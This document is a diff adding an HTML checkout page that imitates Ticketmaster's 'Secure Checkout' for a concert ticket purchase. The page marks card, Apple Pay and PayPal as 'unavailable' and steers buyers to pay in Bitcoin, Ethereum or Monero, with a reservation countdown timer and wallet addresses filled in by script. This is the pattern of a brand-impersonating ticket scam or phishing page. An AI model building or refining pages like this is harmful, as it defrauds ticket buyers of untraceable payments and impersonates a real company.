@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Secure Checkout | Ticketmaster</title>
+<link rel="stylesheet" href="css/base.css" />
+<link rel="stylesheet" href="css/pages.css" />
+<style>
+  /* Checkout specific styles (as before) */
+  body { background: #f5f7fa; font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
+  .checkout-header {
+    height: 72px; background: #fff; border-bottom: 1px solid #e5e8ec;
+    display: flex; align-items: center; justify-content: space-between; padding: 0 5%;
+  }
+  .brand { font-size: 21px; font-weight: 800; letter-spacing: -0.7px; color: #17191d; }
+  .brand .tm-logo { font-size: 21px; }
+  .account { color: #4f5965; font-size: 13px; font-weight: 600; }
+  .progress { width: min(1120px, calc(100% - 40px)); margin: 28px auto 0; display: flex; align-items: center; }
+  .progress-item { display: flex; align-items: center; gap: 9px; color: #9aa2ac; font-size: 12px; font-weight: 650; }
+  .progress-item.active { color: #026cdf; }
+  .progress-number { width: 25px; height: 25px; display: flex; align-items: center; justify-content: center; border-radius: 50%; background: #e9edf2; font-size: 11px; font-weight: 800; }
+  .progress-item.active .progress-number { background: #026cdf; color: white; }
+  .progress-line { width: 70px; height: 1px; margin: 0 14px; background: #dfe3e8; }
+  .checkout-wrapper { width: min(1120px, calc(100% - 40px)); margin: 25px auto 80px; }
+  .checkout-grid { display: grid; grid-template-columns: minmax(0, 1fr) 355px; gap: 24px; align-items: start; }
+  .payment-card { background: #fff; border: 1px solid #e0e4e9; border-radius: 16px; padding: 30px; box-shadow: 0 8px 30px rgba(25,35,45,.055); }
+  .payment-heading { margin-bottom: 26px; }
+  .payment-heading .eyebrow { color: #026cdf; font-size: 10px; font-weight: 800; letter-spacing: 1.6px; }
+  .payment-heading h1 { margin: 8px 0 7px; font-size: 27px; letter-spacing: -1px; }
+  .payment-heading p { margin: 0; color: #707985; font-size: 13px; }
+  .reservation { margin-bottom: 18px; padding: 13px 15px; border: 1px solid #e5e8ec; border-radius: 9px; background: #fafbfc; display: flex; align-items: center; justify-content: space-between; }
+  .reservation span { color: #69727d; font-size: 11px; }
+  .timer { color: #1c2229; font-size: 13px; font-weight: 800; }
+  .payment-options { display: grid; gap: 10px; }
+  .payment-option { position: relative; width: 100%; border: 1px solid #dce1e6; border-radius: 11px; background: #fff; cursor: pointer; transition: border-color .2s, box-shadow .2s; }
+  .payment-option:hover { border-color: #aeb8c3; }
+  .payment-option.selected { border: 2px solid #026cdf; box-shadow: 0 0 0 3px rgba(2,108,223,.07); }
+  .payment-option-header { min-height: 68px; padding: 15px 17px; display: flex; align-items: center; justify-content: space-between; }
+  .payment-left { display: flex; align-items: center; gap: 13px; }
+  .payment-radio { width: 18px; height: 18px; border: 1.5px solid #aab2bb; border-radius: 50%; position: relative; }
+  .payment-option.selected .payment-radio { border-color: #026cdf; }
+  .payment-option.selected .payment-radio::after { content: ""; position: absolute; width: 8px; height: 8px; top: 50%; left: 50%; transform: translate(-50%,-50%); border-radius: 50%; background: #026cdf; }
+  .payment-name { font-size: 14px; font-weight: 700; }
+  .payment-description { display: block; margin-top: 3px; color: #7d8690; font-size: 11px; }
+  .payment-logos { display: flex; gap: 6px; }
+  .card-logo { min-width: 39px; height: 24px; display: flex; align-items: center; justify-content: center; border: 1px solid #e0e4e8; border-radius: 4px; color: #303842; font-size: 8px; font-weight: 800; }
+  .card-form { display: none; padding: 3px 17px 19px; }
+  .payment-option.selected .card-form { display: block; }
+  .field { margin-top: 14px; }
+  .field label { display: block; margin-bottom: 6px; color: #424a53; font-size: 11px; font-weight: 700; }
+  .field input { width: 100%; height: 44px; padding: 0 13px; border: 1px solid #d8dde3; border-radius: 7px; outline: none; background: #fff; color: #171a1f; font-size: 13px; transition: border-color .2s, box-shadow .2s; }
+  .field input:focus { border-color: #026cdf; box-shadow: 0 0 0 3px rgba(2,108,223,.08); }
+  .field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  .external-payment { display: none; }
+  .payment-option.external.selected .external-payment { display: block; padding: 0 17px 18px; }
+  .external-button { width: 100%; height: 43px; border: 1px solid #d7dce1; border-radius: 7px; background: #fff; font-size: 12px; font-weight: 700; cursor: pointer; }
+  .agreement { display: flex; gap: 9px; margin-top: 23px; color: #727b85; font-size: 11px; line-height: 1.55; }
+  .agreement input { margin-top: 2px; }
+  .summary { position: sticky; top: 20px; background: #fff; border: 1px solid #e0e4e9; border-radius: 16px; padding: 24px; box-shadow: 0 8px 30px rgba(25,35,45,.055); }
+  .summary h2 { margin: 0 0 20px; font-size: 17px; letter-spacing: -.3px; }
+  .event-summary { padding-bottom: 18px; border-bottom: 1px solid #e7eaee; }
+  .event-summary strong { display: block; font-size: 14px; }
+  .event-summary span { display: block; margin-top: 5px; color: #747d87; font-size: 11px; }
+  .ticket-summary { padding: 18px 0; }
+  .ticket-line { display: flex; justify-content: space-between; gap: 15px; margin-bottom: 8px; font-size: 12px; }
+  .ticket-line span { color: #737c86; }
+  .summary-divider { height: 1px; background: #e7eaee; }
+  .total { display: flex; align-items: center; justify-content: space-between; padding: 18px 0; }
+  .total span { font-size: 13px; font-weight: 700; }
+  .total strong { font-size: 21px; font-weight: 800; color: #026cdf; }
+  .pay-button { width: 100%; height: 49px; border: 0; border-radius: 8px; background: #026cdf; color: #fff; font-size: 13px; font-weight: 750; cursor: pointer; transition: background .2s, transform .2s; }
+  .pay-button:hover { background: #005ab9; transform: translateY(-1px); }
+  .pay-button:disabled { background: #d8dde2; color: #8b939c; cursor: not-allowed; }
+  .checkout-note { margin: 12px 0 0; color: #8a929b; font-size: 9px; line-height: 1.5; text-align: center; }
+
+  /* unavailable notice */
+  .unavailable-notice {
+    display: none;
+    padding: 0 17px 10px;
+    color: #d92d20;
+    font-size: 12px;
+    line-height: 1.4;
+    background: #fff5f5;
+    border-radius: 0 0 11px 11px;
+    border-top: 1px solid #f0c0c0;
+  }
+  .payment-option.unavailable:hover { border-color: #d92d20; }
+  .payment-option.unavailable .payment-radio { border-color: #d92d20; }
+  .payment-option.unavailable .payment-name { color: #d92d20; }
+
+  @media (max-width: 850px) {
+    .checkout-grid { grid-template-columns: 1fr; }
+    .summary { position: static; }
+  }
+  @media (max-width: 600px) {
+    .checkout-header { height: 62px; padding: 0 16px; }
+    .progress { width: calc(100% - 28px); overflow-x: auto; }
+    .progress-line { min-width: 25px; }
+    .checkout-wrapper { width: calc(100% - 28px); margin-top: 18px; }
+    .payment-card { padding: 21px 17px; border-radius: 13px; }
+    .payment-heading h1 { font-size: 24px; }
+    .payment-logos { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<header class="checkout-header">
+  <div class="brand">
+    <span class="tm-logo"><span class="tm-logo-mark">®</span><span>ticketmaster</span></span>
+  </div>
+  <div class="account">Franklin Odhiambo Otieno</div>
+</header>
+
+<nav class="progress">
+  <div class="progress-item"><span class="progress-number">1</span> Tickets</div>
+  <div class="progress-line"></div>
+  <div class="progress-item active"><span class="progress-number">2</span> Payment</div>
+  <div class="progress-line"></div>
+  <div class="progress-item"><span class="progress-number">3</span> Confirmation</div>
+</nav>
+
+<main class="checkout-wrapper">
+  <div class="checkout-grid">
+    <section class="payment-card">
+      <div class="payment-heading">
+        <span class="eyebrow">SECURE CHECKOUT</span>
+        <h1>Complete your payment</h1>
+        <p>Choose your preferred payment method.</p>
+      </div>
+      <div class="reservation">
+        <span>Reservation expires in</span>
+        <strong class="timer" id="timer">09:38</strong>
+      </div>
+
+      <div class="payment-options">
+        <!-- Card (unavailable) -->
+        <div class="payment-option" data-method="card">
+          <div class="payment-option-header">
+            <div class="payment-left">
+              <span class="payment-radio"></span>
+              <div>
+                <div class="payment-name">Credit or debit card</div>
+                <span class="payment-description">Visa, Mastercard and supported cards</span>
+              </div>
+            </div>
+            <div class="payment-logos">
+              <span class="card-logo">VISA</span>
+              <span class="card-logo">MC</span>
+              <span class="card-logo">AMEX</span>
+            </div>
+          </div>
+          <div class="unavailable-notice">This payment method is currently unavailable. Please use Crypto for fast and reliable payment.</div>
+        </div>
+
+        <!-- Apple Pay (unavailable) -->
+        <div class="payment-option" data-method="apple">
+          <div class="payment-option-header">
+            <div class="payment-left">
+              <span class="payment-radio"></span>
+              <div>
+                <div class="payment-name">Apple Pay</div>
+                <span class="payment-description">Pay securely with your Apple device</span>
+              </div>
+            </div>
+          </div>
+          <div class="unavailable-notice">This payment method is currently unavailable. Please use Crypto for fast and reliable payment.</div>
+        </div>
+
+        <!-- PayPal (unavailable) -->
+        <div class="payment-option" data-method="paypal">
+          <div class="payment-option-header">
+            <div class="payment-left">
+              <span class="payment-radio"></span>
+              <div>
+                <div class="payment-name">PayPal</div>
+                <span class="payment-description">Continue securely with PayPal</span>
+              </div>
+            </div>
+          </div>
+          <div class="unavailable-notice">This payment method is currently unavailable. Please use Crypto for fast and reliable payment.</div>
+        </div>
+
+        <!-- Crypto (available) -->
+        <div class="payment-option selected" data-method="crypto">
+          <div class="payment-option-header">
+            <div class="payment-left">
+              <span class="payment-radio"></span>
+              <div>
+                <div class="payment-name">Cryptocurrencies</div>
+                <span class="payment-description">Pay with Bitcoin, Ethereum, or Monero</span>
+              </div>
+            </div>
+          </div>
+          <div class="external-payment" style="display:block; padding: 0 17px 18px;">
+            <div id="crypto-wallet">
+              <!-- Crypto tabs -->
+              <div style="display:flex; gap:6px; margin-bottom:10px;">
+                <button class="crypto-tab active" data-coin="btc" style="padding:8px 12px; border:1px solid #ddd; border-radius:6px; background:#fff; font-weight:700; cursor:pointer;">Bitcoin</button>
+                <button class="crypto-tab" data-coin="eth" style="padding:8px 12px; border:1px solid #ddd; border-radius:6px; background:#fff; font-weight:700; cursor:pointer;">Ethereum</button>
+                <button class="crypto-tab" data-coin="xmr" style="padding:8px 12px; border:1px solid #ddd; border-radius:6px; background:#fff; font-weight:700; cursor:pointer;">Monero</button>
+              </div>
+              <!-- QR and addresses -->
+              <div id="crypto-panel-btc" class="crypto-panel" style="display:block;">
+                <div style="display:flex; justify-content:center; margin-bottom:10px;"><div id="qr-btc" class="qr-target"></div></div>
+                <div style="display:flex; align-items:center; gap:8px;">
+                  <span style="font-family:monospace; font-size:12px; word-break:break-all;" id="crypto-addr-btc"></span>
+                  <button class="copy-btn" data-target="crypto-addr-btc" style="padding:6px 10px; background:#026cdf; color:#fff; border:none; border-radius:4px; cursor:pointer;">Copy</button>
+                </div>
+              </div>
+              <div id="crypto-panel-eth" class="crypto-panel" style="display:none;">
+                <div style="display:flex; justify-content:center; margin-bottom:10px;"><div id="qr-eth" class="qr-target"></div></div>
+                <div style="display:flex; align-items:center; gap:8px;">
+                  <span style="font-family:monospace; font-size:12px; word-break:break-all;" id="crypto-addr-eth"></span>
+                  <button class="copy-btn" data-target="crypto-addr-eth" style="padding:6px 10px; background:#026cdf; color:#fff; border:none; border-radius:4px; cursor:pointer;">Copy</button>
+                </div>
+              </div>
+              <div id="crypto-panel-xmr" class="crypto-panel" style="display:none;">
+                <div style="display:flex; justify-content:center; margin-bottom:10px;"><div id="qr-xmr" class="qr-target"></div></div>
+                <div style="display:flex; align-items:center; gap:8px;">
+                  <span style="font-family:monospace; font-size:12px; word-break:break-all;" id="crypto-addr-xmr"></span>
+                  <button class="copy-btn" data-target="crypto-addr-xmr" style="padding:6px 10px; background:#026cdf; color:#fff; border:none; border-radius:4px; cursor:pointer;">Copy</button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <label class="agreement">
+        <input type="checkbox" id="terms">
+        <span>I agree to the terms of sale and refund policy. I understand that my order will be confirmed after successful payment.</span>
+      </label>
+    </section>
+
+    <aside class="summary">
+      <h2>Order summary</h2>
+      <div class="event-summary">
+        <strong>The Weeknd</strong>
+        <span>Saturday, 29 August 2026</span>
+        <span>Riyadh Air Metropolitano</span>
+      </div>
+      <div class="ticket-summary" id="ticketSummary">
+        <!-- Will be populated by JS -->
+      </div>
+      <div class="summary-divider"></div>
+      <div class="total">
+        <span>Total due</span>
+        <strong id="grandTotal">€0.00</strong>
+      </div>
+      <button class="pay-button" id="payButton" disabled>Complete payment</button>
+      <p class="checkout-note">Payment should be processed through your authorized payment provider.</p>
+    </aside>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-left">
+      <span class="tm-logo"><span class="tm-logo-mark">®</span><span>ticketmaster</span></span>
+      <div class="footer-links">
+        <span>Looking for Help</span>
+        <a href="#">Discover</a>
+        <a href="#">About Us</a>
+        <a href="#">Join Us</a>
+        <a href="#">Our Network</a>
+        <a href="#">Live Nation</a>
+        <a href="#">Purchase Policy</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Cookie Policy</a>
+        <a href="#">Accessibility Statement</a>
+        <a href="#">Manage my cookies</a>
+      </div>
+    </div>
+    <div class="footer-social">
+      <span>Let's Connect</span>
+      <a href="#">Facebook</a><a href="#">X</a><a href="#">Blog</a><a href="#">Youtube</a><a href="#">Instagram</a><a href="#">LinkedIn</a><a href="#">TikTok</a>
+    </div>
+    <div class="footer-apps">
+      <span>Download Our Apps</span>
+      <a href="#">App Store</a><a href="#">Google Play</a>
+    </div>
+    <div class="footer-copy">© 1999-2026 Ticketmaster. All rights reserved.</div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="js/data.js"></script>
+<script src="js/store.js"></script>
+<!-- Supabase integration scaffold — safe to load, inactive until configured (see js/supabase-client.js) -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="js/supabase-client.js"></script>
+<script src="js/checkout.js"></script>
+</body>
+</html>
